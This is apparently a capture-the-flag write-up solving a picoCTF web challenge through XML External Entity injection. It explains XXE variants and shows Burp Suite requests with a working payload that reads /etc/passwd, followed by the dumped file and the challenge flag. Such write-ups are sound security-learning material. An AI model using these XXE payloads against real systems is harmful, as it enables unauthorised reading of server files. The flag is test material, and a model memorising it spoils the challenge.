# Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

**tags: Web Exploitation, XXE**

## Notes

- Looking at the tag, I probably has to do with XXE
  - XXE (XML External Entity Injection)
    - Web seurity vulnerability that allows an attacker to interfere with an application's processing of XML data
    - Often allows an attacker to view files on the application server filesystem
  - Types of XXE
    - XXE to retrieve files
    - XXE to perform SSRF attacks
      - SSRF: Server-side request forgery
    - Blind XXE exfiltrate data out-of-band
    - Blind XXE to retrieve data via error messages

### exploit

`burpsuite`

- Use proxy browser and open up the website with interception on

```
GET / HTTP/1.1
Host: saturn.picoctf.net:63103
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

- Send the packet to repeater to send the injected code
```
GET / HTTP/1.1
Host: saturn.picoctf.net:63103
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 153

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

- When I sent the packet, injection seems not working
- I manipulated the packet here and there and came across [this](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) website
- I did not have the xml code in the packet
- This time, I intercepted the packet when I clicked one of the button on the website

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:62861
Content-Length: 61
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:62861
Referer: http://saturn.picoctf.net:62861/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>
```

- Now I have to inject the packet below the `<?xml>` tag and replace the content within `<ID>` tag with the proper value in my case `&xxe;`

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:62861
Content-Length: 132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:62861
Referer: http://saturn.picoctf.net:62861/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>
&xxe;</ID></data>
```

- Injection worked!

```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Tue, 14 Nov 2023 03:56:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1024
Connection: close
```

```
Invalid ID: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}
```

**Flag found: picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}**